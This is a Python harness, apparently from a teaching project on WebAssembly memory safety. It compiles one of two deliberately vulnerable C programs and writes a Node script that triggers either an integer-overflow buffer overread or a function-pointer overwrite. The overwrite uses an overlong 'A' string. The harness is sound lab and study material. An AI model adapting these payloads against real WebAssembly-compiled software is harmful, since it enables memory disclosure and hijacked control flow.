
EXPLOITS = {
    "integer_overflow": {
        "description": "integer overflow vulnerability that allows a malicious user to leak memory from adjacent variables (vulnerability bolded)",
        "c_code_path" : 'c/integer_overflow.c',
        "exploit_code": '''
            var result = binary.ccall('buffer_overread', 'None', ['number','number'], [256, 270]);
        '''
    },
    "redirection_hijack": {
        
        "description": '''Wasm does not protect against overwriting function pointers. As a mitigation against function pointer overwrites, Wasm checks the signature of the called function when making an indirect function call, and checks that the signature matches what is expected. The function signature is made up of the number and types of arguments to the function. This means that an exploit cannot transfer execution to a function having the wrong signature.''',
        "c_code_path" : 'c/redirection.c',
        "exploit_code": '''
            var result = binary.ccall('func_ptr_overwrite', 'None', ['string'], ["AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA6"]);
        '''
    }
}


import sys
from subprocess import Popen, PIPE

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("You must provide a exploit to be compiled. Available options:\n")
        for k, value in EXPLOITS.items():
            print("\t id:", k)
            print("\t description:", value["description"])
            print("==========================================================")

        exit(1)
    id = sys.argv[1]

    if not id in EXPLOITS:
        print("Not valid exploit id. Exiting...")
        exit(1)

    print(id)

    p = Popen(["bash", "compile.sh", EXPLOITS[id]["c_code_path"]])
    output, err = p.communicate()

    if output or err:
        print(output, err)

    f = open("exploit.js", 'w')

    f.write('''
    const binary = require("./a.out.js")

        binary.onRuntimeInitialized = function() {{

            {exploit}
        }}

    '''.format(exploit = EXPLOITS[id]["exploit_code"]))

    f.close()

    print("Execute the explit...", "node exploit.js")